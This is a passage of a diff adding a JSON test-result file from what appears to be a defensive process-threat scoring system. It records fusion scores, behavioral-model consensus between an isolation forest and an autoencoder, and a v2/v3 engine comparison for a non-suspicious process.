+          "reason": "Behavioral AI models disagree; consensus confidence was reduced.",
+          "fusion_v3_category_score": 36.81
+        },
+        "active_signals": [],
+        "strong_signals": [],
+        "active_signal_count": 0,
+        "strong_signal_count": 0,
+        "weighted_score": 15.13,
+        "agreement_bonus": 0.0,
+        "strong_bonus": 0.0,
+        "ai_internal_bonus": 0.0,
+        "ai_disagreement_penalty": 8.0,
+        "fusion_score": 14.6033,
+        "severity": "INFO",
+        "suspicious": false,
+        "should_alert": false,
+        "critical_allowed": false,
+        "evidence_confidence": "LOW",
+        "reasons": [],
+        "behavior_indicators": [
+          "monitored_binary"
+        ],
+        "statistical_indicators": [],
+        "fusion_name": "process_threat_fusion_v3",
+        "fusion_version": "v3",
+        "primary_engine": "process_threat_fusion_v3",
+        "operating_mode": "PRODUCTION_PRIMARY",
+        "primary_decision": true,
+        "promoted_to_primary": true,
+        "temporal_ai_score": 0.0,
+        "active_categories": [],
+        "strong_categories": [],
+        "temporal_ai_available": false,
+        "ai_temporal_disagreement": false,
+        "ai_temporal_score_difference": null,
+        "fusion_v3": {
+          "fusion_name": "sentinelx_process_threat_fusion",
+          "fusion_version": "v3",
+          "fusion_score": 14.6033,
+          "severity": "INFO",
+          "suspicious": false,
+          "should_alert": false,
+          "critical_allowed": false,
+          "critical_evidence_gate": false,
+          "evidence_confidence": "LOW",
+          "available_category_count": 3,
+          "active_signal_count": 0,
+          "strong_signal_count": 0,
+          "available_categories": [
+            "rules",
+            "statistical",
+            "behavioral_ai"
+          ],
+          "active_categories": [],
+          "strong_categories": [],
+          "scores": {
+            "rules": 5.0,
+            "statistical": 0.0,
+            "behavioral_ai_consensus": 36.81,
+            "temporal_ai": 0.0
+          },
+          "categories": {
+            "rules": {
+              "available": true,
+              "score": 5.0,
+              "active": false,
+              "strong": false
+            },
+            "statistical": {
+              "available": true,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            },
+            "behavioral_ai": {
+              "available": true,
+              "score": 36.81,
+              "active": false,
+              "strong": false
+            },
+            "temporal_ai": {
+              "available": false,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            }
+          },
+          "behavioral_ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 26.24,
+            "autoencoder_score": 70.13,
+            "average_score": 48.18,
+            "consensus_score": 36.81,
+            "consensus_label": "NORMAL",
+            "agreement": "LOW",
+            "agreement_difference": 43.89,
+            "isolation_forest_active": false,
+            "autoencoder_active": true,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": true,
+            "confidence": "LOW",
+            "reason": "Behavioral AI models disagree; consensus confidence was reduced."
+          },
+          "temporal_ai_available": false,
+          "ai_temporal_score_difference": null,
+          "ai_temporal_disagreement": false,
+          "modifiers": {
+            "active_bonus": 0.0,
+            "strong_bonus": 0.0,
+            "rule_behavior_bonus": 0.0,
+            "rule_temporal_bonus": 0.0,
+            "behavioral_temporal_agreement_bonus": 0.0,
+            "disagreement_penalty": 0.0,
+            "single_source_cap": null,
+            "ai_only_evidence_cap_applied": false
+          },
+          "overall_weighted_score": 14.6033,
+          "active_weighted_score": 0.0,
+          "reasons": [],
+          "interpretation": "Fusion score combines rules, statistical behavior, dual behavioral AI consensus and temporal AI. It is a defensive risk score, not a probability of compromise.",
+          "result_id": 51,
+          "operating_mode": "PRODUCTION_PRIMARY",
+          "bridge_name": "sentinelx_fusion_v3_evidence_bridge",
+          "bridge_version": "v1",
+          "evidence_bridge_complete": true,
+          "fusion_v2_comparison": {
+            "available": true,
+            "fusion_v2_score": 7.13,
+            "fusion_v2_severity": "INFO",
+            "fusion_v2_rule_score": 5.0,
+            "fusion_v2_statistical_score": 0.0,
+            "fusion_v2_ai_consensus_score": 36.81,
+            "score_delta_v3_minus_v2": 7.473300000000001
+          }
+        },
+        "fusion_v2_reference": {
+          "rule_score": 5.0,
+          "statistical_score": 0.0,
+          "ai_consensus_score": 36.81,
+          "ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 26.24,
+            "autoencoder_score": 70.13,
+            "average_score": 48.18,
+            "consensus_score": 36.81,
+            "consensus_label": "NORMAL",
+            "agreement": "LOW",
+            "agreement_difference": 43.89,
+            "isolation_forest_active": false,
+            "autoencoder_active": true,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": true,
+            "confidence": "LOW",
+            "reason": "Behavioral AI models disagree; consensus confidence was reduced.",
+            "fusion_v3_category_score": 36.81
+          },
+          "active_signals": {
+            "rules": false,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "strong_signals": {
+            "rules": false,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "active_signal_count": 0,
+          "strong_signal_count": 0,
+          "weighted_score": 15.13,
+          "agreement_bonus": 0.0,
+          "strong_bonus": 0.0,
+          "ai_internal_bonus": 0.0,
+          "ai_disagreement_penalty": 8.0,
+          "fusion_score": 7.13,
+          "severity": "INFO",
+          "suspicious": false,
+          "should_alert": false,
+          "critical_allowed": false,
+          "evidence_confidence": "NONE",
+          "reasons": [
+            "Isolation Forest and Autoencoder disagree."
+          ],
+          "behavior_indicators": [
+            "monitored_binary"
+          ],
+          "statistical_indicators": []
+        },
+        "rollback_engine": "process_threat_fusion_v2",
+        "rollback_available": true,
+        "fusion_v2_comparison": {
+          "available": true,
+          "fusion_v2_score": 7.13,
+          "fusion_v2_severity": "INFO",
+          "fusion_v2_rule_score": 5.0,
+          "fusion_v2_statistical_score": 0.0,
+          "fusion_v2_ai_consensus_score": 36.81,
+          "score_delta_v3_minus_v2": 7.473300000000001
+        }
+      },
+      "feature_record_id": 51,
+      "detections": [],
+      "stored_detection_count": 0,
+      "live_counter_before": 0,
+      "live_counter_after": 0,
+      "live_isolation_ok": true,
+      "failures": [],
+      "passed": true
+    }
+  ]
+}
